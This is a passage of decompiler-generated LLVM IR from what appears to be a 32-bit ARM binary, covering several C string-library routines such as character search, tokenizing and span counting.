  %v2_17988 = inttoptr i32 %v1_17988 to i8*
  %v3_17988 = load i8, i8* %v2_17988, align 1
  %v4_17988 = zext i8 %v3_17988 to i32
  %v9_1798c = icmp eq i32 %v4_17988, %v1_17914
  br i1 %v9_1798c, label %bb, label %dec_label_pc_1799c

bb:                                               ; preds = %dec_label_pc_17988
  br label %dec_label_pc_179f0

dec_label_pc_1799c:                               ; preds = %dec_label_pc_17988
  %v1_1799c = add i32 %v0_1799059, 2
  %v2_1799c = inttoptr i32 %v1_1799c to i8*
  %v3_1799c = load i8, i8* %v2_1799c, align 1
  %v4_1799c = zext i8 %v3_1799c to i32
  %v9_179a0 = icmp eq i32 %v4_1799c, %v1_17914
  br i1 %v9_179a0, label %dec_label_pc_179f0, label %dec_label_pc_179ac

dec_label_pc_179ac:                               ; preds = %dec_label_pc_1799c
  %v2_179ac = inttoptr i32 %v1_17980 to i8*
  %v3_179ac = load i8, i8* %v2_179ac, align 1
  %v4_179ac = zext i8 %v3_179ac to i32
  %v9_179b0 = icmp eq i32 %v4_179ac, %v1_17914
  br i1 %v9_179b0, label %bb36, label %dec_label_pc_179bc.backedge

bb36:                                             ; preds = %dec_label_pc_179ac
  br label %dec_label_pc_179f0

dec_label_pc_179e4.preheader:                     ; preds = %dec_label_pc_179bc.backedge, %dec_label_pc_17940
  %v0_17990.lcssa = phi i32 [ %v0_17944, %dec_label_pc_17940 ], [ %v4_17950, %dec_label_pc_179bc.backedge ]
  %v0_1796c.lcssa = phi i32 [ %v0_179bc22, %dec_label_pc_17940 ], [ %v1_1796c, %dec_label_pc_179bc.backedge ]
  %v2_179e47 = icmp eq i32 %v0_1796c.lcssa, 0
  br i1 %v2_179e47, label %dec_label_pc_179ec, label %dec_label_pc_179d4

dec_label_pc_179d4:                               ; preds = %dec_label_pc_179e0, %dec_label_pc_179e4.preheader
  %v0_179e4.in = phi i32 [ %v0_179e4, %dec_label_pc_179e0 ], [ %v0_1796c.lcssa, %dec_label_pc_179e4.preheader ]
  %v0_179e0 = phi i32 [ %v1_179e0, %dec_label_pc_179e0 ], [ %v0_17990.lcssa, %dec_label_pc_179e4.preheader ]
  %v0_179e4 = add i32 %v0_179e4.in, -1
  %v1_179d4 = inttoptr i32 %v0_179e0 to i8*
  %v2_179d4 = load i8, i8* %v1_179d4, align 1
  %v3_179d4 = zext i8 %v2_179d4 to i32
  %v9_179d8 = icmp eq i32 %v3_179d4, %v1_17914
  br i1 %v9_179d8, label %dec_label_pc_179f0, label %dec_label_pc_179e0

dec_label_pc_179e0:                               ; preds = %dec_label_pc_179d4
  %v1_179e0 = add i32 %v0_179e0, 1
  %v2_179e4 = icmp eq i32 %v0_179e4, 0
  br i1 %v2_179e4, label %dec_label_pc_179ec, label %dec_label_pc_179d4

dec_label_pc_179ec:                               ; preds = %dec_label_pc_179e0, %dec_label_pc_179e4.preheader
  br label %dec_label_pc_179f0

dec_label_pc_179f0:                               ; preds = %dec_label_pc_1791c, %dec_label_pc_1799c, %dec_label_pc_17974, %dec_label_pc_179d4, %bb36, %bb, %dec_label_pc_179ec
  %v1_179f4 = phi i32 [ 0, %dec_label_pc_179ec ], [ %v1_17988, %bb ], [ %v1_17980, %bb36 ], [ %v0_179e0, %dec_label_pc_179d4 ], [ %v1_1799c, %dec_label_pc_1799c ], [ %v0_1799059, %dec_label_pc_17974 ], [ %v0_1792c, %dec_label_pc_1791c ]
  ret i32 %v1_179f4

; uselistorder directives
  uselistorder i32 %v1_1796c, { 1, 0, 2 }
  uselistorder i32 %v0_1799059, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_17940, { 1, 0 }
  uselistorder i32 %v0_179bc22, { 1, 2, 0 }
  uselistorder i32 %v0_1792c, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v0_17944.pre, { 1, 0 }
  uselistorder i32 %v1_17914, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder label %dec_label_pc_179f0, { 6, 3, 4, 1, 5, 2, 0 }
  uselistorder label %dec_label_pc_179bc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17950, { 1, 0 }
  uselistorder label %dec_label_pc_17940, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17938, { 1, 0 }
}

define i32 @function_17a00() local_unnamed_addr {
dec_label_pc_17a00:
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17a00 = load i32, i32* @r4, align 4
  store i32 %v3_17a00, i32* %stack_var_-16, align 4
  %v0_17a04 = load i32, i32* @r0, align 4
  store i32 %v0_17a04, i32* %r4.global-to-local, align 4
  %v2_17a04 = icmp eq i32 %v0_17a04, 0
  %v1_17a08 = load i32, i32* @r2, align 4
  br i1 %v2_17a04, label %bb, label %dec_label_pc_17a00._crit_edge

bb:                                               ; preds = %dec_label_pc_17a00
  %v2_17a08 = inttoptr i32 %v1_17a08 to i32*
  %v3_17a08 = load i32, i32* %v2_17a08, align 4
  store i32 %v3_17a08, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17a00._crit_edge

dec_label_pc_17a00._crit_edge:                    ; preds = %dec_label_pc_17a00, %bb
  %v0_17a0c = phi i32 [ %v3_17a08, %bb ], [ %v0_17a04, %dec_label_pc_17a00 ]
  store i32 %v0_17a0c, i32* @r0, align 4
  store i32 %v1_17a08, i32* %r5.global-to-local, align 4
  %v0_17a14 = load i32, i32* @r1, align 4
  store i32 %v0_17a14, i32* %r6.global-to-local, align 4
  %v1_17a18 = inttoptr i32 %v0_17a0c to i8*
  %v2_17a18 = call i32 @function_17c4c(i8* %v1_17a18)
  %v0_17a1c = load i32, i32* %r4.global-to-local, align 4
  %v2_17a1c = add i32 %v0_17a1c, %v2_17a18
  %v3_17a1c = inttoptr i32 %v2_17a1c to i8*
  %v4_17a1c = load i8, i8* %v3_17a1c, align 1
  %v6_17a1c = zext i8 %v4_17a1c to i32
  store i32 %v6_17a1c, i32* %r3.global-to-local, align 4
  store i32 %v2_17a1c, i32* @r4, align 4
  %v2_17a24 = icmp eq i8 %v4_17a1c, 0
  br i1 %v2_17a24, label %bb8, label %dec_label_pc_17a30

bb8:                                              ; preds = %dec_label_pc_17a00._crit_edge
  %v2_17a28 = load i32, i32* %r5.global-to-local, align 4
  %v3_17a28 = inttoptr i32 %v2_17a28 to i32*
  store i32 %v2_17a1c, i32* %v3_17a28, align 4
  br label %dec_label_pc_17a6c

dec_label_pc_17a30:                               ; preds = %dec_label_pc_17a00._crit_edge
  %v0_17a30 = load i32, i32* %r6.global-to-local, align 4
  %v3_17a38 = call i32 @function_17df8(i8* %v3_17a1c, i32 %v0_17a30)
  %v3_17a3c = icmp eq i32 %v3_17a38, 0
  br i1 %v3_17a3c, label %dec_label_pc_17a44, label %dec_label_pc_17a5c

dec_label_pc_17a44:                               ; preds = %dec_label_pc_17a30
  %v0_17a48 = load i32, i32* @r4, align 4
  store i32 %v0_17a48, i32* @r0, align 4
  %v2_17a4c = call i32 @function_17abc(i32 %v0_17a48, i32 0)
  %v0_17a50 = load i32, i32* @r4, align 4
  store i32 %v0_17a50, i32* %r3.global-to-local, align 4
  %v1_17a54 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a54 = inttoptr i32 %v1_17a54 to i32*
  store i32 %v2_17a4c, i32* %v2_17a54, align 4
  br label %dec_label_pc_17a6c

dec_label_pc_17a5c:                               ; preds = %dec_label_pc_17a30
  %v4_17a38 = inttoptr i32 %v3_17a38 to i8*
  store i8 0, i8* %v4_17a38, align 1
  %v7_17a60 = add i32 %v3_17a38, 1
  %v1_17a64 = load i32, i32* %r5.global-to-local, align 4
  %v2_17a64 = inttoptr i32 %v1_17a64 to i32*
  store i32 %v7_17a60, i32* %v2_17a64, align 4
  %v0_17a68 = load i32, i32* @r4, align 4
  store i32 %v0_17a68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17a6c

dec_label_pc_17a6c:                               ; preds = %bb8, %dec_label_pc_17a44, %dec_label_pc_17a5c
  %v0_17a6c = load i32, i32* %r3.global-to-local, align 4
  %v2_17a70 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17a70, i32* @r4, align 4
  ret i32 %v0_17a6c

; uselistorder directives
  uselistorder i32 %v3_17a38, { 0, 2, 1 }
  uselistorder i32 %v0_17a0c, { 1, 0 }
  uselistorder i32 %v0_17a04, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 (i8*)* @function_17c4c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17a6c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17a00._crit_edge, { 1, 0 }
}

define i32 @function_17a78() local_unnamed_addr {
dec_label_pc_17a78:
  %stack_var_-16 = alloca i32, align 4
  %v3_17a78 = load i32, i32* @r4, align 4
  store i32 %v3_17a78, i32* %stack_var_-16, align 4
  %v6_17a78 = load i32, i32* @r5, align 4
  %v9_17a78 = load i32, i32* @r6, align 4
  %v0_17a7c = load i32, i32* @r0, align 4
  %v0_17a80 = load i32, i32* @r1, align 4
  store i32 %v0_17a80, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_17a9c8 = inttoptr i32 %v0_17a7c to i8*
  %v2_17a9c9 = load i8, i8* %v1_17a9c8, align 1
  %v2_17aa011 = icmp eq i8 %v2_17a9c9, 0
  store i32 %v0_17a80, i32* @r0, align 4
  %v1_17aa812 = add i32 %v0_17a7c, 1
  store i32 %v1_17aa812, i32* @r4, align 4
  br i1 %v2_17aa011, label %dec_label_pc_17ab0, label %dec_label_pc_17a8c

dec_label_pc_17a8c:                               ; preds = %dec_label_pc_17a78, %dec_label_pc_17a98
  %v3_17a9c14.in = phi i8 [ %v2_17a9c, %dec_label_pc_17a98 ], [ %v2_17a9c9, %dec_label_pc_17a78 ]
  %v0_17aa413 = phi i32 [ %v0_17aa4.pre, %dec_label_pc_17a98 ], [ %v0_17a80, %dec_label_pc_17a78 ]
  %v3_17a9c14 = zext i8 %v3_17a9c14.in to i32
  %v2_17a8c = call i32 @function_12308(i32 %v0_17aa413, i32 %v3_17a9c14)
  %v2_17a90 = icmp eq i32 %v2_17a8c, 0
  %v0_17a98 = load i32, i32* @r5, align 4
  br i1 %v2_17a90, label %dec_label_pc_17a98, label %dec_label_pc_17ab0

dec_label_pc_17a98:                               ; preds = %dec_label_pc_17a8c
  %v1_17a98 = add i32 %v0_17a98, 1
  %v0_17a9c.pre = load i32, i32* @r4, align 4
  %v0_17aa4.pre = load i32, i32* @r6, align 4
  store i32 %v1_17a98, i32* @r5, align 4
  %v1_17a9c = inttoptr i32 %v0_17a9c.pre to i8*
  %v2_17a9c = load i8, i8* %v1_17a9c, align 1
  %v2_17aa0 = icmp eq i8 %v2_17a9c, 0
  store i32 %v0_17aa4.pre, i32* @r0, align 4
  %v1_17aa8 = add i32 %v0_17a9c.pre, 1
  store i32 %v1_17aa8, i32* @r4, align 4
  br i1 %v2_17aa0, label %dec_label_pc_17ab0, label %dec_label_pc_17a8c

dec_label_pc_17ab0:                               ; preds = %dec_label_pc_17a98, %dec_label_pc_17a8c, %dec_label_pc_17a78
  %v0_17ab0 = phi i32 [ 0, %dec_label_pc_17a78 ], [ %v0_17a98, %dec_label_pc_17a8c ], [ %v1_17a98, %dec_label_pc_17a98 ]
  %v2_17ab4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17ab4, i32* @r4, align 4
  store i32 %v6_17a78, i32* @r5, align 4
  store i32 %v9_17a78, i32* @r6, align 4
  ret i32 %v0_17ab0

; uselistorder directives
  uselistorder i8 %v2_17a9c, { 1, 0 }
  uselistorder i32 %v0_17aa4.pre, { 1, 0 }
  uselistorder i32 %v0_17a9c.pre, { 1, 0 }
  uselistorder label %dec_label_pc_17a8c, { 1, 0 }
}

define i32 @function_17abc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17abc:
  %v1_17ac0 = urem i32 %arg1, 256
  %v0_17ad82 = load i32, i32* @r0, align 4
  %v1_17ad83 = urem i32 %v0_17ad82, 4
  %v2_17ad84 = icmp eq i32 %v1_17ad83, 0
  br i1 %v2_17ad84, label %dec_label_pc_17ae0, label %dec_label_pc_17ac8

dec_label_pc_17ac8:                               ; preds = %dec_label_pc_17abc, %dec_label_pc_17ad4
  %v0_17ad4 = phi i32 [ %v1_17ad4, %dec_label_pc_17ad4 ], [ %v0_17ad82, %dec_label_pc_17abc ]
  %v1_17ac8 = inttoptr i32 %v0_17ad4 to i8*
  %v2_17ac8 = load i8, i8* %v1_17ac8, align 1
  %v3_17ac8 = zext i8 %v2_17ac8 to i32
  %v9_17acc = icmp eq i32 %v3_17ac8, %v1_17ac0
  br i1 %v9_17acc, label %dec_label_pc_17b5c, label %dec_label_pc_17ad4

dec_label_pc_17ad4:                               ; preds = %dec_label_pc_17ac8
  %v1_17ad4 = add i32 %v0_17ad4, 1
  %v1_17ad8 = urem i32 %v1_17ad4, 4
  %v2_17ad8 = icmp eq i32 %v1_17ad8, 0
  br i1 %v2_17ad8, label %dec_label_pc_17ae0, label %dec_label_pc_17ac8

dec_label_pc_17ae0:                               ; preds = %dec_label_pc_17ad4, %dec_label_pc_17abc
  %v0_17ae4 = phi i32 [ %v0_17ad82, %dec_label_pc_17abc ], [ %v1_17ad4, %dec_label_pc_17ad4 ]
  %v4_17ae0 = mul nuw nsw i32 %v1_17ac0, 256
  %v5_17ae0 = or i32 %v4_17ae0, %v1_17ac0
  %v4_17ae8 = mul i32 %v5_17ae0, 65536
  %v5_17ae8 = or i32 %v4_17ae8, %v5_17ae0
  br label %dec_label_pc_17aec

dec_label_pc_17aec:                               ; preds = %dec_label_pc_17b4c, %dec_label_pc_17aec, %dec_label_pc_17ae0
  %v0_17b30 = phi i32 [ %v0_17ae4, %dec_label_pc_17ae0 ], [ %v4_17aec, %dec_label_pc_17aec ], [ %v4_17aec, %dec_label_pc_17b4c ]
  %v1_17aec = inttoptr i32 %v0_17b30 to i32*
  %v2_17aec = load i32, i32* %v1_17aec, align 4
  %v4_17aec = add i32 %v0_17b30, 4
  %v2_17af4 = xor i32 %v2_17aec, %v5_17ae8
  %v2_17af8 = add i32 %v2_17af4, 2130640639
  %v1_17b00 = sub i32 -1, %v2_17af4
  %v2_17b04 = xor i32 %v2_17af8, %v1_17b00
  %v2_17b08 = and i32 %v2_17b04, -2130640640
  %v2_17b0c = icmp eq i32 %v2_17b08, 0
  br i1 %v2_17b0c, label %dec_label_pc_17aec, label %dec_label_pc_17b14

dec_label_pc_17b14:                               ; preds = %dec_label_pc_17aec
  %v2_17b14 = inttoptr i32 %v0_17b30 to i8*
  %v3_17b14 = load i8, i8* %v2_17b14, align 1
  %v4_17b14 = zext i8 %v3_17b14 to i32
  %v9_17b1c = icmp eq i32 %v4_17b14, %v1_17ac0
  %v1_17b20 = add i32 %v0_17b30, 3
  br i1 %v9_17b1c, label %dec_label_pc_17b5c, label %dec_label_pc_17b28

dec_label_pc_17b28:                               ; preds = %dec_label_pc_17b14
  %v1_17b28 = add i32 %v0_17b30, 1
  %v2_17b28 = inttoptr i32 %v1_17b28 to i8*
  %v3_17b28 = load i8, i8* %v2_17b28, align 1
  %v4_17b28 = zext i8 %v3_17b28 to i32
  %v9_17b2c = icmp eq i32 %v4_17b28, %v1_17ac0
  br i1 %v9_17b2c, label %bb, label %dec_label_pc_17b3c

bb:                                               ; preds = %dec_label_pc_17b28
  br label %dec_label_pc_17b5c

dec_label_pc_17b3c:                               ; preds = %dec_label_pc_17b28
  %v1_17b3c = add i32 %v0_17b30, 2
  %v2_17b3c = inttoptr i32 %v1_17b3c to i8*
  %v3_17b3c = load i8, i8* %v2_17b3c, align 1
  %v4_17b3c = zext i8 %v3_17b3c to i32
  %v9_17b40 = icmp eq i32 %v4_17b3c, %v1_17ac0
  br i1 %v9_17b40, label %dec_label_pc_17b5c, label %dec_label_pc_17b4c

dec_label_pc_17b4c:                               ; preds = %dec_label_pc_17b3c
  %v2_17b4c = inttoptr i32 %v1_17b20 to i8*
  %v3_17b4c = load i8, i8* %v2_17b4c, align 1
  %v4_17b4c = zext i8 %v3_17b4c to i32
  %v9_17b50 = icmp eq i32 %v4_17b4c, %v1_17ac0
  br i1 %v9_17b50, label %dec_label_pc_17b58, label %dec_label_pc_17aec

dec_label_pc_17b58:                               ; preds = %dec_label_pc_17b4c
  br label %dec_label_pc_17b5c

dec_label_pc_17b5c:                               ; preds = %dec_label_pc_17ac8, %dec_label_pc_17b3c, %dec_label_pc_17b14, %bb, %dec_label_pc_17b58
  %v1_17b60 = phi i32 [ %v1_17b20, %dec_label_pc_17b58 ], [ %v1_17b28, %bb ], [ %v1_17b3c, %dec_label_pc_17b3c ], [ %v0_17b30, %dec_label_pc_17b14 ], [ %v0_17ad4, %dec_label_pc_17ac8 ]
  ret i32 %v1_17b60

; uselistorder directives
  uselistorder i32 %v4_17aec, { 1, 0 }
  uselistorder i32 %v0_17b30, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_17ae0, { 1, 0 }
  uselistorder i32 %v1_17ad4, { 1, 0, 2 }
  uselistorder i32 %v0_17ad82, { 2, 1, 0 }
  uselistorder i32 %v1_17ac0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_17b5c, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_17ac8, { 1, 0 }
}

define i32 @function_17b6c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17b6c:
  %v1_17b70 = urem i32 %arg2, 256
  %v2_17b74 = add i32 %arg3, %arg1
  %v2_17b8c4 = icmp eq i32 %arg3, 0
  br i1 %v2_17b8c4, label %dec_label_pc_17b9c, label %dec_label_pc_17b94

dec_label_pc_17b7c:                               ; preds = %dec_label_pc_17b94
  %v1_17b7c = add i32 %v0_17b7c, -1
  %v2_17b7c = inttoptr i32 %v1_17b7c to i8*
  %v3_17b7c = load i8, i8* %v2_17b7c, align 1
  %v4_17b7c = zext i8 %v3_17b7c to i32
  %v9_17b80 = icmp eq i32 %v4_17b7c, %v1_17b70
  br i1 %v9_17b80, label %dec_label_pc_17c3c, label %dec_label_pc_17b88

dec_label_pc_17b88:                               ; preds = %dec_label_pc_17b7c
  %v1_17b88 = add i32 %v0_17b88, -1
  %v2_17b8c = icmp eq i32 %v1_17b88, 0
  br i1 %v2_17b8c, label %dec_label_pc_17b9c, label %dec_label_pc_17b94

dec_label_pc_17b94:                               ; preds = %dec_label_pc_17b6c, %dec_label_pc_17b88
  %v0_17b88 = phi i32 [ %v1_17b88, %dec_label_pc_17b88 ], [ %arg3, %dec_label_pc_17b6c ]
  %v0_17b7c = phi i32 [ %v1_17b7c, %dec_label_pc_17b88 ], [ %v2_17b74, %dec_label_pc_17b6c ]
  %v1_17b94 = urem i32 %v0_17b7c, 4
  %v2_17b94 = icmp eq i32 %v1_17b94, 0
  br i1 %v2_17b94, label %dec_label_pc_17b9c, label %dec_label_pc_17b7c

dec_label_pc_17b9c:                               ; preds = %dec_label_pc_17b88, %dec_label_pc_17b94, %dec_label_pc_17b6c
  %v0_17c2413 = phi i32 [ %v2_17b74, %dec_label_pc_17b6c ], [ %v1_17b7c, %dec_label_pc_17b88 ], [ %v0_17b7c, %dec_label_pc_17b94 ]
  %v0_17c109 = phi i32 [ 0, %dec_label_pc_17b6c ], [ 0, %dec_label_pc_17b88 ], [ %v0_17b88, %dec_label_pc_17b94 ]
  %v4_17b9c = mul nuw nsw i32 %v1_17b70, 256
  %v5_17b9c = or i32 %v4_17b9c, %v1_17b70
  %v4_17ba0 = mul i32 %v5_17b9c, 65536
  %v5_17ba0 = or i32 %v4_17ba0, %v5_17b9c
  store i32 2130640639, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_17c109, 3
  br i1 %tmp, label %dec_label_pc_17ba8, label %dec_label_pc_17c30

dec_label_pc_17ba8:                               ; preds = %dec_label_pc_17b9c, %dec_label_pc_17c10.backedge
  %v0_17bc440 = phi i32 [ %v1_17bc4, %dec_label_pc_17c10.backedge ], [ %v0_17c109, %dec_label_pc_17b9c ]
  %v0_17ba839 = phi i32 [ %v1_17ba8, %dec_label_pc_17c10.backedge ], [ %v0_17c2413, %dec_label_pc_17b9c ]
  %v1_17ba8 = add i32 %v0_17ba839, -4
  %v2_17ba8 = inttoptr i32 %v1_17ba8 to i32*
  %v3_17ba8 = load i32, i32* %v2_17ba8, align 4
  %v2_17bac = xor i32 %v3_17ba8, %v5_17ba0
  %v2_17bb0 = add i32 %v2_17bac, 2130640639
  store i32 %v2_17bb0, i32* @ip, align 4
  %v1_17bb4 = sub i32 -1, %v2_17bac
  %v2_17bb8 = xor i32 %v2_17bb0, %v1_17bb4
  %v2_17bbc = and i32 %v2_17bb8, -2130640640
  %v2_17bc0 = icmp eq i32 %v2_17bbc, 0
  %v1_17bc4 = add i32 %v0_17bc440, -4
  br i1 %v2_17bc0, label %dec_label_pc_17c10.backedge, label %dec_label_pc_17bcc

dec_label_pc_17c10.backedge:                      ; preds = %dec_label_pc_17ba8, %dec_label_pc_17c04
  store i32 2130640639, i32* @ip, align 4
  %tmp46 = icmp ugt i32 %v1_17bc4, 3
  br i1 %tmp46, label %dec_label_pc_17ba8, label %dec_label_pc_17c30

dec_label_pc_17bcc:                               ; preds = %dec_label_pc_17ba8
  %v1_17bcc = add i32 %v0_17ba839, -1
  %v2_17bcc = inttoptr i32 %v1_17bcc to i8*
  %v3_17bcc = load i8, i8* %v2_17bcc, align 1
  %v4_17bcc = zext i8 %v3_17bcc to i32
  %v9_17bd0 = icmp eq i32 %v4_17bcc, %v1_17b70
  br i1 %v9_17bd0, label %dec_label_pc_17bfc, label %dec_label_pc_17bdc

dec_label_pc_17bdc:                               ; preds = %dec_label_pc_17bcc
  %v1_17bdc = add i32 %v0_17ba839, -2
  %v2_17bdc = inttoptr i32 %v1_17bdc to i8*
  %v3_17bdc = load i8, i8* %v2_17bdc, align 1
  %v4_17bdc = zext i8 %v3_17bdc to i32
  %v9_17be0 = icmp eq i32 %v4_17bdc, %v1_17b70
  br i1 %v9_17be0, label %dec_label_pc_17bfc, label %dec_label_pc_17bec

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17bdc
  %v1_17bec = add i32 %v0_17ba839, -3
  %v2_17bec = inttoptr i32 %v1_17bec to i8*
  %v3_17bec = load i8, i8* %v2_17bec, align 1
  %v4_17bec = zext i8 %v3_17bec to i32
  %v9_17bf0 = icmp eq i32 %v4_17bec, %v1_17b70
  br i1 %v9_17bf0, label %dec_label_pc_17bfc, label %dec_label_pc_17c04

dec_label_pc_17bfc:                               ; preds = %dec_label_pc_17bec, %dec_label_pc_17bdc, %dec_label_pc_17bcc
  %v0_17bfc = phi i32 [ %v1_17bec, %dec_label_pc_17bec ], [ %v1_17bdc, %dec_label_pc_17bdc ], [ %v1_17bcc, %dec_label_pc_17bcc ]
  br label %dec_label_pc_17c3c

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17bec
  %v1_17c04 = inttoptr i32 %v1_17ba8 to i8*
  %v2_17c04 = load i8, i8* %v1_17c04, align 1
  %v3_17c04 = zext i8 %v2_17c04 to i32
  %v9_17c08 = icmp eq i32 %v3_17c04, %v1_17b70
  br i1 %v9_17c08, label %dec_label_pc_17c3c, label %dec_label_pc_17c10.backedge

dec_label_pc_17c24:                               ; preds = %dec_label_pc_17c30
  %v1_17c30 = add i32 %v0_17c30, -1
  %v1_17c24 = add i32 %v0_17c24, -1
  %v2_17c24 = inttoptr i32 %v1_17c24 to i8*
  %v3_17c24 = load i8, i8* %v2_17c24, align 1
  %v4_17c24 = zext i8 %v3_17c24 to i32
  %v9_17c28 = icmp eq i32 %v4_17c24, %v1_17b70
  br i1 %v9_17c28, label %dec_label_pc_17c3c, label %dec_label_pc_17c30

dec_label_pc_17c30:                               ; preds = %dec_label_pc_17b9c, %dec_label_pc_17c10.backedge, %dec_label_pc_17c24
  %v0_17c24 = phi i32 [ %v1_17c24, %dec_label_pc_17c24 ], [ %v0_17c2413, %dec_label_pc_17b9c ], [ %v1_17ba8, %dec_label_pc_17c10.backedge ]
  %v0_17c30 = phi i32 [ %v1_17c30, %dec_label_pc_17c24 ], [ %v0_17c109, %dec_label_pc_17b9c ], [ %v1_17bc4, %dec_label_pc_17c10.backedge ]
  %v2_17c30 = icmp eq i32 %v0_17c30, 0
  br i1 %v2_17c30, label %dec_label_pc_17c38, label %dec_label_pc_17c24

dec_label_pc_17c38:                               ; preds = %dec_label_pc_17c30
  br label %dec_label_pc_17c3c

dec_label_pc_17c3c:                               ; preds = %dec_label_pc_17b7c, %dec_label_pc_17c04, %dec_label_pc_17c24, %dec_label_pc_17bfc, %dec_label_pc_17c38
  %v1_17c40 = phi i32 [ %v0_17bfc, %dec_label_pc_17bfc ], [ 0, %dec_label_pc_17c38 ], [ %v1_17c24, %dec_label_pc_17c24 ], [ %v1_17ba8, %dec_label_pc_17c04 ], [ %v1_17b7c, %dec_label_pc_17b7c ]
  ret i32 %v1_17c40

; uselistorder directives
  uselistorder i32 %v0_17c30, { 1, 0 }
  uselistorder i32 %v1_17bc4, { 1, 0, 2 }
  uselistorder i32 %v1_17ba8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_17ba839, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17b9c, { 1, 0 }
  uselistorder i32 %v0_17c109, { 1, 2, 0 }
  uselistorder i32 %v0_17b7c, { 1, 0, 2 }
  uselistorder i32 %v2_17b74, { 1, 0 }
  uselistorder i32 %v1_17b70, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 -3, { 0, 1, 2, 4, 3 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17c3c, { 4, 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17c30, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17c10.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_17ba8, { 1, 0 }
  uselistorder label %dec_label_pc_17b9c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17b94, { 1, 0 }
}

define i32 @function_17c4c(i8* %arg1) local_unnamed_addr {
dec_label_pc_17c4c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_17c7c2 = load i32, i32* @r0, align 4
  %v1_17c7c3 = inttoptr i32 %v0_17c7c2 to i8*
  %v2_17c7c4 = load i8, i8* %v1_17c7c3, align 1
  %v3_17c7c5 = zext i8 %v2_17c7c4 to i32
  store i32 %v3_17c7c5, i32* @ip, align 4
  %v2_17c806 = icmp eq i8 %v2_17c7c4, 0
  br i1 %v2_17c806, label %dec_label_pc_17c8c, label %dec_label_pc_17c60.preheader

dec_label_pc_17c58:                               ; preds = %dec_label_pc_17c60
  %v3_17c60 = zext i8 %v2_17c60 to i32
  %v1_17c68 = add i32 %v0_17c68, 1
  %v9_17c58 = icmp eq i32 %v0_17c5810, %v3_17c60
  br i1 %v9_17c58, label %dec_label_pc_17c74, label %dec_label_pc_17c60

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c60.preheader, %dec_label_pc_17c58
  %v0_17c68 = phi i32 [ %tmp, %dec_label_pc_17c60.preheader ], [ %v1_17c68, %dec_label_pc_17c58 ]
  %v1_17c60 = inttoptr i32 %v0_17c68 to i8*
  %v2_17c60 = load i8, i8* %v1_17c60, align 1
  %v2_17c64 = icmp eq i8 %v2_17c60, 0
  br i1 %v2_17c64, label %dec_label_pc_17c8c, label %dec_label_pc_17c58

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17c58
  %v1_17c74 = add i32 %v0_17c74, 1
  %v1_17c78 = add i32 %v0_17c78, 1
  %v1_17c7c = inttoptr i32 %v1_17c78 to i8*
  %v2_17c7c = load i8, i8* %v1_17c7c, align 1
  %v3_17c7c = zext i8 %v2_17c7c to i32
  store i32 %v3_17c7c, i32* @ip, align 4
  %v2_17c80 = icmp eq i8 %v2_17c7c, 0
  br i1 %v2_17c80, label %dec_label_pc_17c8c, label %dec_label_pc_17c60.preheader

dec_label_pc_17c60.preheader:                     ; preds = %dec_label_pc_17c4c, %dec_label_pc_17c74
  %v0_17c78 = phi i32 [ %v1_17c78, %dec_label_pc_17c74 ], [ %v0_17c7c2, %dec_label_pc_17c4c ]
  %v0_17c74 = phi i32 [ %v1_17c74, %dec_label_pc_17c74 ], [ 0, %dec_label_pc_17c4c ]
  %v0_17c5810 = phi i32 [ %v3_17c7c, %dec_label_pc_17c74 ], [ %v3_17c7c5, %dec_label_pc_17c4c ]
  br label %dec_label_pc_17c60

dec_label_pc_17c8c:                               ; preds = %dec_label_pc_17c74, %dec_label_pc_17c60, %dec_label_pc_17c4c
  %v0_17c8c = phi i32 [ 0, %dec_label_pc_17c4c ], [ %v0_17c74, %dec_label_pc_17c60 ], [ %v1_17c74, %dec_label_pc_17c74 ]
  ret i32 %v0_17c8c

; uselistorder directives
  uselistorder i32 %v0_17c68, { 1, 0 }
  uselistorder label %dec_label_pc_17c60.preheader, { 1, 0 }
}

define i32 @function_17c98(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17c98:
  store i32 %arg1, i32* @r0, align 4
  %v1_17c9c = urem i32 %arg2, 256
  store i32 %v1_17c9c, i32* @r4, align 4
  %v2_17c9c = icmp eq i32 %v1_17c9c, 0
  br i1 %v2_17c9c, label %dec_label_pc_17cb0, label %dec_label_pc_17cc4.preheader

dec_label_pc_17cc4.preheader:                     ; preds = %dec_label_pc_17c98
